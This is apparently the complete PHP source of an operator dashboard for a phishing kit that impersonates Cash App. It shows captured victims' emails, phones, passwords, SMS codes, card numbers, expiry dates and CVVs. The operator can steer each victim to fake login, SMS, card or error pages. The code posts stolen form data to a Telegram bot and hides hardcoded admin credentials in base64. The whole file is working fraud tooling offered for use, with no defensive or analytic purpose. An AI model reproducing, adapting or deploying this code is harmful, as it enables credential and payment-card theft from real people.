<?php
session_start();

define('ADMIN_USER', base64_decode('YWRtaW4='));
define('ADMIN_PASS', base64_decode('aXRhY2hpM2Q='));

// --- AUTO BASE64 IMAGE CONVERTER ---
$bg_image_code = '';
$local_image = __DIR__ . '/../img/itachi.jpg';

if (file_exists($local_image)) {
    $type = pathinfo($local_image, PATHINFO_EXTENSION);
    $data = file_get_contents($local_image);
    $base64 = base64_encode($data);
    $bg_image_code = 'data:image/' . $type . ';base64,' . $base64;
} else {
    // Fallback URL if image is missing
    $bg_image_code = 'https://i.pinimg.com/originals/3f/3d/23/3f3d2345694982055029765821204867.jpg';
}

$isLoggedIn = isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true;

// Log
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['log'])) {
    if ($_POST['username'] === ADMIN_USER && $_POST['password'] === ADMIN_PASS) {
        $_SESSION['admin_logged_in'] = true;
        $isLoggedIn = true;
    } else {
        $logError = 'Incorrect Credentials';
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: index.php');
    exit;
}

// --- DATA ---
// use updated panel handler functions
require __DIR__ . '/panel.php';

// --- QUICK ACTIONS (from Telegram inline buttons) ---
$script_path = $_SERVER['SCRIPT_NAME'];
$project_root = rtrim(dirname(dirname(dirname($script_path))), '/');

if ($isLoggedIn && $_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action']) && $_POST['action'] === 'save_config') {
        $cfg = [
            'bot_token' => $_POST['bot_token'] ?? '',
            'chat_id' => $_POST['chat_id'] ?? ''
        ];
        saveConfig($cfg);
    }
}

$quick = $_GET['quick'] ?? '';
$qip = $_GET['ip'] ?? '';
if ($quick && $qip) {
    $visitors = getVisitors();
    if ($quick === 'block') {
        $blocked = getBlockedIPs();
        if (!in_array($qip, $blocked)) { $blocked[] = $qip; saveBlockedIPs($blocked); }
        foreach ($visitors as $k => $v) { if ($v['ip'] === $qip) { $visitors[$k]['status'] = 'blocked'; $visitors[$k]['last_update'] = time(); } }
        saveVisitors($visitors);
        echo "✅ Blocked IP $qip";
        exit;
    }
    if ($quick === 'redirect') {
        $page = $_GET['page'] ?? 'login';
        $pages = [
            'login' => '/auth/login.php',
            'sms' => '/auth/sms.php',
            'card' => '/auth/card.php',
            'success' => '/auth/success.php',
            'log_error' => '/auth/log.php?error=1',
            'official' => 'https://cash.app'
        ];
        $url = $project_root . ($pages[$page] ?? '//auth/login.php');
        foreach ($visitors as $k => $v) { if ($v['ip'] === $qip) { $visitors[$k]['redirect_url'] = $url; $visitors[$k]['status'] = 'redirected'; $visitors[$k]['last_update'] = time(); } }
        saveVisitors($visitors);
        echo "✅ Redirected $qip to $page";
        exit;
    }
    if ($quick === 'delete') {
        $new = []; foreach ($visitors as $v) { if ($v['ip'] !== $qip) $new[] = $v; }
        saveVisitors($new);
        echo "✅ Deleted $qip";
        exit;
    }
}

// --- ACTIONS ---
if ($isLoggedIn && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $visitors = getVisitors();
    $blocked = getBlockedIPs();

    if ($action === 'redirect') {
        $id = $_POST['visitor_id'] ?? '';
        $url = $_POST['redirect_url'] ?? '';
        foreach ($visitors as $key => $v) {
            if ($v['id'] === $id) {
                $visitors[$key]['redirect_url'] = $url;
                $visitors[$key]['status'] = 'redirected';
                $visitors[$key]['last_update'] = time();
                
                // 🧾 Build Telegram Message
                $client_ip = $v['ip'] ?? 'Unknown';
                $country = $v['country'] ?? 'XX';
                $timestamp = $v['timestamp'] ?? date('Y-m-d H:i:s');
                $formData = isset($v['form_data']) ? $v['form_data'] : [];
                
                $msg = "📊 Panel Redirect Event\n";
                $msg .= "IP: {$client_ip}\n";
                $msg .= "Country: {$country}\n";
                $msg .= "Time: {$timestamp}\n\n";

                foreach ($formData as $k => $val) {
                    $k_str = is_array($k) ? json_encode($k) : (string)$k;
                    $v_str = is_array($val) ? json_encode($val) : (string)$val;
                    $safe_k = htmlspecialchars($k_str, ENT_QUOTES, 'UTF-8');
                    $safe_v = htmlspecialchars($v_str, ENT_QUOTES, 'UTF-8');
                    $msg .= "🔹 <b>$safe_k:</b> <code>$safe_v</code>\n";
                }

                $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
                $host = $_SERVER['HTTP_HOST'];
                $panel_script = $_SERVER['SCRIPT_NAME'];
                $panel_link = "$protocol://$host$panel_script";
                $msg .= "\n🥷 <a href='{$panel_link}'>Open Panel By ITACHI</a>";

                $cfg = getConfig();
                $tgUrl = "https://api.telegram.org/bot" . $cfg['bot_token'] . "/sendMessage";
                $tgParams = [
                    'chat_id' => $cfg['chat_id'],
                    'text' => $msg,
                    'parse_mode' => 'HTML',
                    'disable_web_page_preview' => true
                ];
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $tgUrl);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($tgParams));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                $result = curl_exec($ch);
                curl_close($ch);

                break;
            }
        }
        saveVisitors($visitors);
    }

    if ($action === 'block') {
        $ip = $_POST['ip'] ?? '';
        if (!in_array($ip, $blocked)) {
            $blocked[] = $ip;
            saveBlockedIPs($blocked);
        }
        foreach ($visitors as $key => $v) {
            if ($v['ip'] === $ip) {
                $visitors[$key]['status'] = 'blocked';
            }
        }
        saveVisitors($visitors);
    }

    if ($action === 'unblock') {
        $ip = $_POST['ip'] ?? '';
        $blocked_new = array();
        foreach ($blocked as $b) {
            if ($b !== $ip) $blocked_new[] = $b;
        }
        saveBlockedIPs($blocked_new);
    }

    if ($action === 'delete') {
        $id = $_POST['visitor_id'] ?? '';
        $new_visitors = array();
        foreach ($visitors as $v) {
            if ($v['id'] !== $id) $new_visitors[] = $v;
        }
        saveVisitors($new_visitors);
    }

    if ($action === 'clear_all') {
        saveVisitors(array());
    }

    if ($action === 'save_config') {
        $cfg = [
            'bot_token' => $_POST['bot_token'] ?? '',
            'chat_id' => $_POST['chat_id'] ?? ''
        ];
        saveConfig($cfg);
    }

    header('Location: index.php');
    exit;
}

$config = $isLoggedIn ? getConfig() : [];
$visitors = $isLoggedIn ? getVisitors() : array();
$blockedIPs = $isLoggedIn ? getBlockedIPs() : array();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ITACHI // CYBER COMMAND</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon-green: #00ff9d;
            --neon-blue: #00b8ff;
            --neon-red: #ff3864;
            
            /* ✅ Darker panels to contrast with bright background */
            --glass-bg: rgba(0, 0, 0, 0.85); 
            --glass-border: 1px solid rgba(255, 255, 255, 0.2);
            --glass-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.9);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }

        body {
            background-color: #050505;
            /* AUTO BASE64 BACKGROUND */
            background-image: url('<?php echo $bg_image_code; ?>');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            background-repeat: no-repeat;
            color: white;
            min-height: 100vh;
            font-size: 14px;
            overflow-x: hidden;
        }

        /* ✅ LIGHTER OVERLAY (So image is very visible) */
        .bg-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.3); /* Only 30% darkness */
            z-index: -1;
        }

        /* GLASSMORPHISM */
        .glass-panel {
            background: var(--glass-bg);
            backdrop-filter: blur(5px);
            -webkit-backdrop-filter: blur(5px);
            border: var(--glass-border);
            box-shadow: var(--glass-shadow);
        }

        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }

        /* NAVBAR */
        .navbar {
            position: sticky; top: 20px; z-index: 100;
            border-radius: 12px; padding: 15px 25px;
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 30px;
        }
        .logo { font-weight: 800; font-size: 18px; color: var(--neon-green); text-shadow: 0 0 15px rgba(0,255,157,0.4); letter-spacing: 1px; }
        .btn-logout {
            background: rgba(255, 56, 100, 0.15); color: var(--neon-red);
            padding: 8px 16px; border-radius: 8px; text-decoration: none; font-weight: 600;
            border: 1px solid rgba(255, 56, 100, 0.3); transition: 0.3s;
        }
        .btn-logout:hover { background: var(--neon-red); color: white; box-shadow: 0 0 15px var(--neon-red); }
        .btn-settings {
            background: rgba(0, 184, 255, 0.15); color: var(--neon-blue);
            padding: 8px 16px; border-radius: 8px; text-decoration: none; font-weight: 600;
            border: 1px solid rgba(0, 184, 255, 0.3); transition: 0.3s; cursor: pointer;
            font-size: 13px; font-family: 'Inter', sans-serif; margin-right: 8px;
        }
        .btn-settings:hover { background: var(--neon-blue); color: white; box-shadow: 0 0 15px var(--neon-blue); }

        /* STATS */
        .stats-grid {
            display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 30px;
        }
        .stat-card {
            border-radius: 12px; padding: 15px; text-align: center;
            transition: 0.3s; border-left: 4px solid var(--neon-green);
        }
        .stat-card:hover { transform: translateY(-3px); background: rgba(255,255,255,0.1); }
        .stat-label { font-size: 11px; color: #ccc; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
        .stat-num { font-size: 24px; font-weight: 800; color: white; }

        /* TOOLBAR */
        .toolbar {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 15px; padding: 0 10px;
        }
        .live-tag { display: flex; align-items: center; gap: 8px; color: var(--neon-green); font-weight: 600; text-shadow: 0 0 5px rgba(0,0,0,0.8); background: rgba(0,0,0,0.5); padding: 5px 10px; border-radius: 20px; }
        .pulse { width: 8px; height: 8px; background: var(--neon-green); border-radius: 50%; box-shadow: 0 0 10px var(--neon-green); animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
        
        .btn-purge {
            background: rgba(0,0,0,0.8); border: 1px solid #666; color: #ccc; padding: 6px 14px;
            border-radius: 6px; cursor: pointer; font-size: 12px; transition: 0.2s;
        }
        .btn-purge:hover { border-color: var(--neon-red); color: var(--neon-red); background: black; }

        /* CARDS GRID */
        .grid-layout {
            display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px;
        }
        
        .v-card {
            border-radius: 12px; overflow: hidden; transition: 0.3s;
            position: relative; display: flex; flex-direction: column;
        }
        .v-card:hover { border-color: var(--neon-green); box-shadow: 0 0 20px rgba(0,255,157,0.2); }
        
        .v-head {
            padding: 12px 15px; border-bottom: 1px solid rgba(255,255,255,0.1);
            display: flex; justify-content: space-between; align-items: center;
            background: rgba(255,255,255,0.05);
        }
        .ip-badge { background: rgba(0,0,0,0.5); padding: 4px 8px; border-radius: 4px; font-family: monospace; color: var(--neon-green); letter-spacing: 0.5px; border: 1px solid rgba(0,255,157,0.3); }
        
        .v-body { padding: 15px; font-size: 13px; flex-grow: 1; }
        .row { display: flex; justify-content: space-between; margin-bottom: 8px; }
        .lbl { color: #bbb; font-weight: 500; }
        .val { font-weight: 600; text-align: right; }
        .val img { vertical-align: middle; margin-right: 5px; border-radius: 2px; }

        .data-box {
            background: rgba(0,0,0,0.6); border-radius: 6px; padding: 10px; margin-top: 12px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .d-item { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 4px; padding-bottom: 4px; border-bottom: 1px dashed rgba(255,255,255,0.1); }
        .d-item:last-child { border: none; margin: 0; padding: 0; }
        .d-key { color: var(--neon-blue); }

        /* FOOTER WITH EQUAL BUTTONS */
        .v-foot {
            padding: 12px; 
            border-top: 1px solid rgba(255,255,255,0.1);
            display: grid;
            grid-template-columns: 1fr 1fr; 
            gap: 10px;
            background: rgba(0,0,0,0.4);
        }

        .action-btn {
            width: 100%;
            padding: 12px 0;
            border-radius: 6px;
            font-weight: 700;
            font-size: 11px;
            cursor: pointer;
            text-align: center;
            transition: all 0.3s ease;
            border: none;
            text-transform: uppercase;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
        }

        .b-redirect {
            grid-column: span 2;
            background: linear-gradient(135deg, var(--neon-green), #0091ff);
            color: #000;
            box-shadow: 0 4px 15px rgba(0, 255, 157, 0.3);
        }
        .b-redirect:hover {
            box-shadow: 0 0 25px var(--neon-green);
            transform: translateY(-2px);
            color: white;
        }
        
        .b-block {
            background: rgba(0, 184, 255, 0.15);
            color: var(--neon-blue);
            border: 1px solid var(--neon-blue);
        }
        .b-block:hover {
            background: var(--neon-blue);
            color: white;
            box-shadow: 0 0 15px var(--neon-blue);
        }
        
        .b-del {
            background: rgba(255, 56, 100, 0.15);
            color: var(--neon-red);
            border: 1px solid var(--neon-red);
        }
        .b-del:hover {
            background: var(--neon-red);
            color: white;
            box-shadow: 0 0 15px var(--neon-red);
        }

        /* LOG */
        .log-wrap { height: 100vh; display: flex; align-items: center; justify-content: center; position: relative; z-index: 2; }
        .log-card { width: 350px; padding: 40px; border-radius: 16px; text-align: center; border: 1px solid rgba(255,255,255,0.2); }
        .log-title { font-size: 22px; font-weight: 800; margin-bottom: 30px; color: white; letter-spacing: 2px; text-shadow: 0 0 10px black; }
        .inp {
            width: 100%; background: rgba(0,0,0,0.7); border: 1px solid #444; color: white;
            padding: 12px; border-radius: 8px; margin-bottom: 15px; outline: none; transition: 0.3s;
        }
        .inp:focus { border-color: var(--neon-green); box-shadow: 0 0 10px rgba(0,255,157,0.2); }
        .btn-sub {
            width: 100%; background: linear-gradient(45deg, var(--neon-green), #00b8ff);
            border: none; padding: 12px; border-radius: 8px; color: black; font-weight: 800; cursor: pointer;
            margin-top: 10px; transition: 0.3s;
        }
        .btn-sub:hover { opacity: 0.9; transform: scale(1.02); box-shadow: 0 0 20px rgba(0,255,157,0.4); }

        /* MODAL */
        .modal-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); backdrop-filter: blur(5px);
            display: none; align-items: center; justify-content: center; z-index: 9999;
        }
        .modal-win {
            width: 420px; border-radius: 16px; overflow: hidden;
            border: 1px solid rgba(255,255,255,0.2);
            transform: scale(0.9); opacity: 0; transition: 0.3s;
        }
        .modal-bg.active .modal-win { transform: scale(1); opacity: 1; }
        
        .m-head { padding: 20px; background: rgba(255,255,255,0.1); display: flex; justify-content: space-between; align-items: center; font-weight: 700; border-bottom: 1px solid rgba(255,255,255,0.1); }
        .m-close { cursor: pointer; color: #888; font-size: 18px; }
        .m-body { padding: 20px; }
        
        .opt {
            padding: 15px; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 10px; margin-bottom: 10px; cursor: pointer; display: flex; align-items: center; gap: 15px;
            transition: 0.2s;
        }
        .opt:hover { background: rgba(0,255,157,0.2); border-color: var(--neon-green); }
        .opt-icon { font-size: 18px; width: 30px; text-align: center; }
        .opt-txt { font-weight: 600; font-size: 14px; }
        .opt-sub { font-size: 10px; color: #aaa; margin-left: auto; font-family: monospace; }

        /* BLOCK LIST */
        .block-tag {
            display: inline-flex; align-items: center; background: rgba(255,56,100,0.2); 
            border: 1px solid var(--neon-red); color: var(--neon-red); padding: 5px 12px; 
            border-radius: 20px; font-size: 12px; margin: 5px;
        }
        .block-x { margin-left: 8px; cursor: pointer; font-weight: bold; color: white; }

    </style>
</head>
<body>

<div class="bg-overlay"></div>

<?php if (!$isLoggedIn): ?>
    <div class="log-wrap">
        <div class="log-card glass-panel">
            <div class="log-title">ITACHI // ACCESS</div>
            <?php if(isset($logError)): ?>
                <div style="color: var(--neon-red); margin-bottom: 15px; font-size: 12px;"><?php echo $logError; ?></div>
            <?php endif; ?>
            <form method="POST">
                <input type="text" name="username" class="inp" placeholder="User ID" required>
                <input type="password" name="password" class="inp" placeholder="Security Key" required>
                <button type="submit" name="log" class="btn-sub">AUTHENTICATE</button>
            </form>
        </div>
    </div>
<?php else: ?>

    <div class="container">
        <nav class="navbar glass-panel">
            <div class="logo">🔥Panel By itachi🔥 </div>
            <div>
                <button class="btn-settings" onclick="openSettings()">⚙ SETTINGS</button>
                <a href="?logout=1" class="btn-logout">DISCONNECT</a>
            </div>
        </nav>

        <div class="stats-grid">
            <div class="stat-card glass-panel">
                <div class="stat-label">Total Targets</div>
                <div class="stat-num"><?php echo count($visitors); ?></div>
            </div>
            <div class="stat-card glass-panel" style="border-color: var(--neon-blue);">
                <div class="stat-label">Online Now</div>
                <div class="stat-num" style="color: var(--neon-blue);">
                    <?php $act=0; foreach($visitors as $v) if(($v['status']??'')!=='blocked') $act++; echo $act; ?>
                </div>
            </div>
            <div class="stat-card glass-panel" style="border-color: var(--neon-red);">
                <div class="stat-label">Blacklisted</div>
                <div class="stat-num" style="color: var(--neon-red);"><?php echo count($blockedIPs); ?></div>
            </div>
        </div>

        <div class="toolbar">
            <div class="live-tag"><div class="pulse"></div> LIVE VICTIME</div>
            <?php if(!empty($visitors)): ?>
                <form method="POST" onsubmit="return confirm('Clear all?');">
                    <input type="hidden" name="action" value="clear_all">
                    <button type="submit" class="btn-purge">Clear Logs</button>
                </form>
            <?php endif; ?>
        </div>

        <div class="grid-layout">
            <?php if(empty($visitors)): ?>
                <div style="grid-column: 1/-1; text-align: center; padding: 60px; color: #ccc; background: rgba(0,0,0,0.5); border-radius: 12px; border: 1px dashed #555;">
                    WAITING FOR SIGNALS...
                </div>
            <?php else: ?>
                <?php foreach(array_reverse($visitors) as $v): 
                    $stClass = ''; 
                    $stText = 'Active';
                    $stColor = 'var(--neon-green)';
                    
                    if(($v['status']??'') == 'redirected') { $stClass = 'st-redirected'; $stText = 'Redirected'; $stColor = 'var(--neon-blue)'; }
                    if(($v['status']??'') == 'blocked') { $stClass = 'st-blocked'; $stText = 'Blocked'; $stColor = 'var(--neon-red)'; }
                ?>
                <div class="v-card glass-panel <?php echo $stClass; ?>">
                    <div class="v-head">
                        <span class="ip-badge">📡 <?php echo htmlspecialchars($v['ip']); ?></span>
                        <span style="color: #ccc; font-size: 11px;"><?php echo date('H:i:s', strtotime($v['timestamp']??'now')); ?></span>
                    </div>
                    <div class="v-body">
                        <div class="row">
                            <span class="lbl">📍 Location</span>
                            <span class="val">
                                <img src="https://flagcdn.com/16x12/<?php echo strtolower($v['country']??'xx'); ?>.png"> 
                                <?php echo htmlspecialchars($v['country']??'UNK'); ?>
                            </span>
                        </div>
                        <div class="row">
                            <span class="lbl">📑 Page</span>
                            <span class="val" style="color: var(--neon-blue);"><?php echo htmlspecialchars($v['page']??'N/A'); ?></span>
                        </div>
                        <div class="row">
                            <span class="lbl">⚡ Status</span>
                            <span class="val" style="color: <?php echo $stColor; ?>;"><?php echo $stText; ?></span>
                        </div>



                        <?php if(isset($v['form_data']) && count($v['form_data']) > 0): ?>
                        <div class="data-box">
                            <?php 
                            $seen_labels = [];
                            foreach($v['form_data'] as $k => $val): 
                                if(in_array($k, ['action','page','country','ip','user_agent','ua','referrer','referer','referrer_url','ref','timestamp','screen_resolution','screen','viewport','blocked_reason','page_type','selected_challenge','contactType','loginType','fingerprint'])) continue;
                                
                                $label = htmlspecialchars($k);
                                if ($k === 'j_username' || $k === 'email' || $k === 'username' || $k === 'userInput') {
                                    $label = (strpos($val, '@') !== false) ? '📧 Email' : '📱 Phone';
                                } elseif ($k === 'value') {
                                    $label = (strpos($val, '@') !== false) ? '📧 Email' : '📱 Phone';
                                } elseif ($k === 'method') {
                                    $label = '🔑 Method';
                                } elseif ($k === 'j_passwordword' || $k === 'password' || $k === 'passwordword' || $k === 'passwordfield') {
                                    $label = '🔑 Password';
                                } elseif ($k === 'sms_code' || $k === 'code') {
                                    $label = '📩 SMS Code';
                                } elseif ($k === 'attempt') {
                                    $label = '🔄 Attempt';
                                } elseif ($k === 'card_number' || $k === 'cardNumber') {
                                    $label = '💳 Card Number';
                                } elseif ($k === 'expiry' || $k === 'expiryDate') {
                                    $label = '📅 Expiry';
                                } elseif ($k === 'cvv') {
                                    $label = '🔐 CVV';
                                } elseif ($k === 'name' || $k === 'cardHolder') {
                                    $label = '👤 Name';
                                }
                                
                                if (isset($seen_labels[$label])) continue;
                                $seen_labels[$label] = true;
                                
                                echo "<div class='d-item'><span class='d-key'>$label</span> <span style='color:#eee;'>".htmlspecialchars($val)."</span></div>";
                            endforeach; ?>
                        </div>
                        <?php endif; ?>
                        
                        <?php if(!empty($v['redirect_url'])): ?>
                        <div style="margin-top: 10px; font-size: 11px; text-align: right; color: var(--neon-green);">
                            &rarr; <?php echo htmlspecialchars(basename($v['redirect_url'])); ?>
                        </div>
                        <?php endif; ?>
                    </div>
                    
                    <div class="v-foot">
                        <button class="action-btn b-redirect" onclick="openModal('<?php echo $v['id']; ?>')">
                            REDIRECT TARGET
                        </button>
                        
                        <form method="POST" style="display:contents">
                            <input type="hidden" name="action" value="block">
                            <input type="hidden" name="ip" value="<?php echo $v['ip']; ?>">
                            <button class="action-btn b-block">
                                BLOCK IP
                            </button>
                        </form>
                        
                        <form method="POST" style="display:contents">
                            <input type="hidden" name="action" value="delete">
                            <input type="hidden" name="visitor_id" value="<?php echo $v['id']; ?>">
                            <button class="action-btn b-del">
                                DELETE LOG
                            </button>
                        </form>
                    </div>
                </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
        
        <?php if(!empty($blockedIPs)): ?>
        <div style="margin-top: 40px; border-top: 1px solid rgba(255,255,255,0.2); padding-top: 20px;">
            <h4 style="color: var(--neon-red); margin-bottom: 15px;">BLACKLISTED IPS</h4>
            <div>
                <?php foreach($blockedIPs as $ip): ?>
                <div class="block-tag">
                    <?php echo $ip; ?>
                    <form method="POST" style="display:inline">
                        <input type="hidden" name="action" value="unblock">
                        <input type="hidden" name="ip" value="<?php echo $ip; ?>">
                        <span class="block-x" onclick="this.parentNode.submit()">✕</span>
                    </form>
                </div>
                <?php endforeach; ?>
            </div>
        </div>
        <?php endif; ?>
    </div>

    <div id="redirectModal" class="modal-bg">
        <div class="modal-win glass-panel">
            <div class="m-head">
                <span>SELECT DESTINATION</span>
                <span class="m-close" onclick="closeModal()">✕</span>
            </div>
            <div class="m-body">
                <?php
                $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
                $host = $_SERVER['HTTP_HOST'];
                $script_path = $_SERVER['SCRIPT_NAME'];
                $project_root = rtrim(dirname(dirname(dirname($script_path))), '/');
                ?>
                <form method="POST" id="redirectForm">
                    <input type="hidden" name="action" value="redirect">
                    <input type="hidden" name="visitor_id" id="modalVisitorId">
                    <input type="hidden" name="redirect_url" id="modalUrlInput">
                    
                    <div class="opt" onclick="doRedirect('<?php echo $project_root; ?>/auth/login.php')">
                        <span class="opt-icon">🔓</span>
                        <span class="opt-txt">Login</span>
                        <span class="opt-sub">login.php</span>
                    </div>
                    <div class="opt" onclick="doRedirect('<?php echo $project_root; ?>/auth/sms.php')">
                        <span class="opt-icon">📱</span>
                        <span class="opt-txt">SMS Code</span>
                        <span class="opt-sub">sms.php</span>
                    </div>
                    <div class="opt" onclick="doRedirect('<?php echo $project_root; ?>/auth/card.php')">
                        <span class="opt-icon">💳</span>
                        <span class="opt-txt">Card</span>
                        <span class="opt-sub">card.php</span>
                    </div>
                    <div class="opt" onclick="doRedirect('<?php echo $project_root; ?>/success.html')">
                        <span class="opt-icon">✅</span>
                        <span class="opt-txt">Success</span>
                        <span class="opt-sub">success.html</span>
                    </div>
                    <div class="opt" onclick="doRedirect('<?php echo $project_root; ?>/auth/log.php?error=1')">
                        <span class="opt-icon">❌</span>
                        <span class="opt-txt">Login Error</span>
                        <span class="opt-sub">Error Page</span>
                    </div>
                    <div class="opt" onclick="doRedirect('https://cash.app')">
                        <span class="opt-icon">🏦</span>
                        <span class="opt-txt">Official Site</span>
                        <span class="opt-sub">cash.app</span>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Settings Modal -->
    <div id="settingsModal" class="modal-bg">
        <div class="modal-win glass-panel">
            <div class="m-head">
                <span>⚙ TELEGRAM SETTINGS</span>
                <span class="m-close" onclick="closeSettings()">✕</span>
            </div>
            <div class="m-body">
                <form method="POST">
                    <input type="hidden" name="action" value="save_config">
                    <div style="margin-bottom:15px">
                        <label style="color:#bbb;font-size:12px;display:block;margin-bottom:5px">Bot Token</label>
                        <input type="text" name="bot_token" class="inp" value="<?php echo htmlspecialchars($config['bot_token'] ?? ''); ?>" placeholder="123456:ABCdef...">
                    </div>
                    <div style="margin-bottom:20px">
                        <label style="color:#bbb;font-size:12px;display:block;margin-bottom:5px">Chat ID</label>
                        <input type="text" name="chat_id" class="inp" value="<?php echo htmlspecialchars($config['chat_id'] ?? ''); ?>" placeholder="-123456789">
                    </div>
                    <button type="submit" class="btn-sub">SAVE</button>
                </form>
            </div>
        </div>
    </div>

    <script>
        function openModal(id) {
            document.getElementById('modalVisitorId').value = id;
            const modal = document.getElementById('redirectModal');
            modal.style.display = 'flex';
            setTimeout(() => modal.classList.add('active'), 10);
        }

        function closeModal() {
            const modal = document.getElementById('redirectModal');
            modal.classList.remove('active');
            setTimeout(() => modal.style.display = 'none', 300);
        }

        function openSettings() {
            const modal = document.getElementById('settingsModal');
            modal.style.display = 'flex';
            setTimeout(() => modal.classList.add('active'), 10);
        }

        function closeSettings() {
            const modal = document.getElementById('settingsModal');
            modal.classList.remove('active');
            setTimeout(() => modal.style.display = 'none', 300);
        }

        function doRedirect(url) {
            document.getElementById('modalUrlInput').value = url;
            document.getElementById('redirectForm').submit();
        }
        
        window.onclick = function(e) {
            if(e.target == document.getElementById('redirectModal')) closeModal();
            if(e.target == document.getElementById('settingsModal')) closeSettings();
        }

        // Auto refresh disabled per user request
        // setTimeout(() => { 
        //     window.location.reload(); 
        // }, 7000);
    </script>
<?php endif; ?>
</body>
</html>